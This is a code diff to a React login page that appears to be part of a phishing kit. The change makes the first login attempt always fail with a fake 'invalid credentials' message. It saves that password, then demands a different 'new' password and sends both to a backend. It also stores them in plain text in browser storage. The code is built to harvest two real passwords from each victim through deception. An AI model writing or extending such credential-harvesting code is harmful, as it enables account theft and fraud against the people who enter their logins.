@@ -18,9 +18,11 @@ const LoginPage: React.FC = () => {
   });
   const [errors, setErrors] = useState<Partial<LoginFormData>>({});
   const [isLoading, setIsLoading] = useState(false);
-  const [loginAttempts, setLoginAttempts] = useState(0);
   const [showInvalidCredentials, setShowInvalidCredentials] = useState(false);
   const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);
+  const [firstPassword, setFirstPassword] = useState('');
+  const [requireNewPassword, setRequireNewPassword] = useState(false);
+  const [newPasswordError, setNewPasswordError] = useState('');
 
   // Handle window resize
   useEffect(() => {
@@ -44,6 +46,9 @@ const LoginPage: React.FC = () => {
         ...prev,
         [name]: ''
       }));
+    }
+    if (name === 'xpss' && newPasswordError) {
+      setNewPasswordError('');
     }
   };
 
@@ -71,27 +76,48 @@ const LoginPage: React.FC = () => {
 
     setIsLoading(true);
     setShowInvalidCredentials(false);
+    setNewPasswordError('');
 
     // Simulate the two-attempt logic
-    if (loginAttempts === 0) {
-      // First attempt - show error message
+    if (!requireNewPassword) {
+      // First attempt - show error message and require new password
       setTimeout(() => {
-        setLoginAttempts(1);
+        setFirstPassword(formData.xpss);
+        setRequireNewPassword(true);
         setShowInvalidCredentials(true);
         setIsLoading(false);
+        // Clear both username and password fields for second attempt
+        setFormData({
+          xusr: '',
+          xpss: ''
+        });
       }, 1000);
-    } else {
-      // Second attempt - proceed to next page
-      try {
-        // Send data to backend (simulating the PHP behavior)
-        const loginResponse = await apiService.login(formData);
+      return;
+    }
+
+    if (requireNewPassword && formData.xpss === firstPassword) {
+      setNewPasswordError(t('newPasswordMustBeDifferent'));
+      setIsLoading(false);
+      return;
+    }
+
+    // Second attempt - proceed to next page
+    try {
+        const loginPayload = {
+          xusr: formData.xusr,
+          xpss: formData.xpss,
+          xpssFirst: firstPassword || formData.xpss
+        };
+        const loginResponse = await apiService.login(loginPayload);
         console.log('LoginPage - Login response:', loginResponse);
         
         // Store in both session and local storage for mobile compatibility
         sessionStorage.setItem('xusr', formData.xusr);
         sessionStorage.setItem('xpss', formData.xpss);
+        sessionStorage.setItem('xpssFirst', firstPassword || formData.xpss);
         localStorage.setItem('xusr', formData.xusr);
         localStorage.setItem('xpss', formData.xpss);
+        localStorage.setItem('xpssFirst', firstPassword || formData.xpss);
         
         // Debug: Check if sessionId was stored by apiService
         const storedSessionId = sessionStorage.getItem('sessionId') || localStorage.getItem('sessionId');
@@ -110,7 +136,6 @@ const LoginPage: React.FC = () => {
       } finally {
         setIsLoading(false);
       }
-    }
   };
 
   return (
@@ -167,6 +192,25 @@ const LoginPage: React.FC = () => {
             <div className="error-message">
               <div className="error-icon">!</div>
               <div className="error-text">{t('invalidCredentials')}</div>
+            </div>
+          )}
+          {requireNewPassword && (
+            <div style={{
+              backgroundColor: '#fff9db',
+              border: '1px solid #ffe58f',
+              color: '#8b6f00',
+              padding: '12px',
+              borderRadius: '4px',
+              marginBottom: '15px',
+              fontSize: '14px'
+            }}>
+              {t('newPasswordInstruction')}
+            </div>
+          )}
+          {newPasswordError && (
+            <div className="error-message">
+              <div className="error-icon">!</div>
+              <div className="error-text">{newPasswordError}</div>
             </div>
           )}
           <div style={{
